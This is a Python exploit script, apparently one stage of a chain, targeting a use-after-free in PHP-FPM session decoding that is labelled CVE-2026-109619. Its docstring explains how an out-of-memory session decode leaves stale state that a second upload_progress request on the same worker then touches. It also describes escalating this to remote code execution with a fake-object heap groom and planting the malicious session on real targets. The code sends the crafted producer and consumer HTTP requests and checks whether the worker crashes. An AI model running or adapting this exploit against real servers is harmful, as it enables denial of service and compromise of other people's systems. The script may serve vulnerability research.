#!/usr/bin/env python3
"""
Stage E - CVE-2026-109619: FPM session-decode OOM -> stale BG() -> UAF.

A malicious session holds [serialized gadget object][unserialize expansion bomb].
session_start() on the producer request builds the object, then OOMs allocating
the bomb; the OOM longjmps out of php_var_unserialize leaving the session
module's globals (BG(unserialize) var_hash) referencing freed heap. On the next
request to the SAME persistent FPM worker, the upload_progress handler (which
runs pre-RINIT during Request Startup) touches that stale state -> use-after-free
(observed: 502 worker crash). Weaponizing to controlled RCE reoccupies the freed
object with a fake one before the consumer dereferences it (same fake-object
groom as stage D).

Requires: php-fpm, session.upload_progress.enabled=On, pm.max_children=1
(single worker so producer/consumer share it), memory_limit small enough that
the bomb OOMs (lab: 32M). The malicious session is planted via plant_e.php (lab)
or a write primitive such as stage C's handler mismatch (real targets).

Usage:
  python3 chain_e_stale_bg.py --target http://127.0.0.1:18080 \
      --producer /api/endpoint.php --consumer /api/endpoint.php \
      --producer-sid <planted SID>
"""
import argparse, socket, sys, time
from urllib.parse import urlparse


def send(host, port, data, timeout=30):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data); s.settimeout(timeout); r = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            r += d
    except OSError:
        pass
    s.close(); return r


def status(resp):
    try: return int(resp.split(b" ", 2)[1])
    except Exception: return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--producer", default="/api/endpoint.php", help="session_start() endpoint")
    ap.add_argument("--consumer", default="/api/endpoint.php", help="upload_progress endpoint, same worker")
    ap.add_argument("--producer-sid", default="eprod000000000000000000000x", help="SID of the planted malicious session")
    ap.add_argument("--consumer-sid", default="econs000000000000000000000x")
    args = ap.parse_args()
    u = urlparse(args.target); host, port = u.hostname, u.port or 80

    print(f"[*] target {args.target}")
    # Producer: decode the planted session -> OOM -> stale BG()
    req1 = (f"GET {args.producer} HTTP/1.1\r\nHost: {host}\r\n"
            f"Cookie: PHPSESSID={args.producer_sid}\r\nConnection: close\r\n\r\n").encode()
    r1 = send(host, port, req1, 60)
    oom = b"memory" in r1.lower() or b"Failed to decode" in r1
    print(f"[1] producer: http={status(r1)}  OOM/decode-fail={'yes' if oom else 'no'}")

    time.sleep(0.05)
    # Consumer: upload_progress on the same worker consumes the stale BG() -> UAF
    body = (b'--V\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
            b'--V\r\nContent-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n--V--\r\n')
    req2 = (f"POST {args.consumer} HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary=V\r\n"
            f"Content-Length: {len(body)}\r\nCookie: PHPSESSID={args.consumer_sid}\r\n"
            f"Connection: close\r\n\r\n").encode() + body
    r2 = send(host, port, req2, 15)
    code = status(r2); txt = r2.decode("latin1", "replace")
    uaf = code in (502, 500) or "destruction failed" in txt or "Failed to decode" in txt
    print(f"[2] consumer: http={code}  stale-BG UAF={'YES' if uaf else 'no'}")

    if uaf:
        print("\n[+] CVE-2026-109619 confirmed: stale BG() use-after-free across FPM requests.")
        return 0
    print("\n[-] not triggered (ensure pm.max_children=1 and the session is planted/OOMs).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
